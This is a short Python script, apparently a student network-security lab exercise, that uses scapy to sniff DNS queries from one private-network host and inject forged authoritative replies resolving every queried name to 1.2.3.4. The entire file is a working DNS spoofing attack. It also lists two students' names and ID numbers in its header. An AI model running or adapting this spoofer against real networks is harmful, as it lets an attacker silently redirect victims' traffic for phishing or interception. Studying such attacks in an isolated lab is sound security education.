#!/usr/bin/env python3

# Sagiv Antebi - 318159282
# Dvir Amram   - 318192200

from scapy.all import *

#The PC interface in our route list
iface_request = "enp0s8"

#The filter for the packet we want to catch and chane - port 53 - and the specific IP
filter_pack = " and ".join(["udp dst port 53", "udp[10]&0x80 = 0", "src host 192.168.56.102"])

#The function to eate the packet we want to return
def make_packet(packet):
    #The Ethernet packet we change
    eth_pack = Ether(src=packet[Ether].dst, dst=packet[Ether].src)

    #The IP packet we change
    ip_pack = IP(src=packet[IP].dst, dst=packet[IP].src)

    #The UDP packet we change
    udp_pack = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)

    #The DNS packet we change
    dns_pack = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0,
                   ar=DNSRR(rrname=packet[DNS].qd.qname, type='A', ttl=600, rdata="1.2.3.4"))

    #Creating the packet we want to response with to enp0s8
    response_packet = eth_pack / ip_pack / udp_pack / dns_pack

    #Sending the new packet to enp0s8
    sendp(response_packet, iface=iface_request)

#Main Operation - sniff the filtered packet from the giver iface - and return the packet we made (make_packet)
sniff(filter=filter_pack, prn=make_packet, store=0, iface=iface_request)
